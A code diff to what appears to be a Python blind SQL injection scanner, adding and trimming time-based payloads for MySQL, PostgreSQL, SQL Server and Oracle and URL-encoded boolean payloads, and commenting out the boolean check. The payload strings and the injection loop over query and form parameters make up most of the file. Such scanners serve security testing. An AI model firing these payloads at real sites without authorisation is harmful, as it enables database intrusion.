@@ -1,37 +1,33 @@
-from utils import add_url_params, change_url_params, get_url_host, get_form_params, compare, POST, GET
+from utils import add_url_params, change_url_params, get_url_host, get_form_params, POST, GET
 from urlparse import urlparse, urljoin, parse_qsl
 from client import NotAPage, RedirectedToExternal
 
 import copy
-import time
-
-
 
 #(select(0)from(select(sleep({0})))v)/*'+(select(0)from(select(sleep({0})))v)+'\"+(select(0)from(select(sleep({0})))v)+\"*/
 TIME_INJECTIONS = {
-    "MySQL": ("(select(0)from(select(sleep({0})))v)/*'+(select(0)from(select(sleep({0})))v)+'\"+(select(0)from(select(sleep({0})))v)+\"*/", "if(now()=sysdate(),sleep({0}),0)/*'XOR(if(now()=sysdate(),sleep({0}),0))OR'\"XOR(if(now()=sysdate(),sleep({0}),0))OR\"*/",),
+    "MySQL": ("if(now()=sysdate(),sleep({0}),0)/*'XOR(if(now()=sysdate(),sleep({0}),0))OR'\"XOR(if(now()=sysdate(),sleep({0}),0))OR\"*/",),
     "PostgreSQL": (";SELECT pg_sleep({0})--", ");SELECT pg_sleep({0})--", "';SELECT pg_sleep({0})--", "');SELECT pg_sleep({0})--", "));SELECT pg_sleep({0})--", "'));SELECT pg_sleep({0})--", "SELECT pg_sleep({0})--"),
     "Microsoft SQL Server": ("; WAIT FOR DELAY '00:00:{0}'",),
     "Oracle": ("BEGIN DBMS_LOCK.SLEEP({0}); END;",),
 }
 
 BOOLEAN_INJECTIONS = {
-    " AND 3*2*1=6 AND 119=119": True,
-    " AND 3*2*2=6 AND 119=119": False,
-    " AND 3*2*1=6 AND 119=118": False,
-    " AND 5*4=20 AND 119=119": True,
-    " AND 5*4=21 AND 119=119": False,
-    " AND 7*7>48 AND 119=119": True
+    "%20AND%203*2*1=6%20AND%20119=119": True,
+    "%20AND%203*2*2=6%20AND%20119=119": False,
+    "%20AND%203*2*1=6%20AND%20119=118": False,
+    "%20AND%205*4=20%20AND%20119=119": True,
+    "%20AND%205*4=21%20AND%20119=119": False,
+    "%20AND%207*7>48%20AND%20119=119": True
 }
-
-BOOL_TEST_COUNT = len(BOOLEAN_INJECTIONS)
 
 def sql_blind(page, client):
     print "Scanning SQL Blind in page {}".format(page.url)
+    parsed_url = urlparse(page.url)
 
-    if urlparse(page.url).query:
+    if parsed_url.query:
         time_based_blind(client, page.url, method=GET)
-        boolean_blind(client, page)
+        # boolean_blind(client, page)
 
     for form in page.get_forms():
         action = urljoin(page.url, form.get('action'))
@@ -45,29 +41,9 @@ def sql_blind(page, client):
         time_based_blind(client, action, method, params)
 
 
-def boolean_blind(client, page):
-    page_content = list(page.document.stripped_strings)
-    parsed_url = urlparse(page.url)
-    url_parts = list(parsed_url)
-    query = dict(parse_qsl(url_parts[4]))
+# def boolean_blind(client, page):
+#     for inj, is_correct in BOOLEAN_INJECTIONS.iteritems():
 
-    for param, value in query.iteritems():
-        successed = 0
-        for payload, is_correct in BOOLEAN_INJECTIONS.iteritems():
-
-            injected_action = add_url_params(parsed_url, {param: value + payload})
-
-            try:
-                res_page = client.get_req(injected_action)
-                if is_correct == compare(page_content, list(res_page.document.stripped_strings)):
-                    successed += 1
-            except NotAPage:
-                continue
-            except RedirectedToExternal:
-                continue
-
-        if successed == BOOL_TEST_COUNT:
-            print 'SQL blind (boolean) in param {}'.format(param)
 
 
 def time_based_blind(client, action, method, params=None):
@@ -96,7 +72,7 @@ def time_based_blind(client, action, method, params=None):
                         inject.update(immutable)
 
                         try:
-                            # print method, injected_action, inject
+                            print method, injected_action, inject
                             req_time = request_injection(client, injected_action, method, inject).response.elapsed.total_seconds()
                             successed.append([t, req_time])
                         except NotAPage:
@@ -104,7 +80,6 @@ def time_based_blind(client, action, method, params=None):
                         except RedirectedToExternal:
                             continue
 
-                    print successed
                     if successed and all(t <= rt for t, rt in successed):
                         print 'SQL blind db {} in form {} param {} injection {}'.format(db, action, urlparse(action).query, payload)
 
@@ -129,7 +104,7 @@ def time_based_blind(client, action, method, params=None):
 
                 print successed
                 if successed and all(t <= rt for t, rt in successed):
-                    print 'SQL blind db {} in form {} param {} injection {}'.format(db, action, param, payload)
+                    print 'SQL blind db {} in form {} param {} injection {}'.format(db, action, urlparse(action).query, payload)
 
 
 def inject_param(parameters, param, injection):
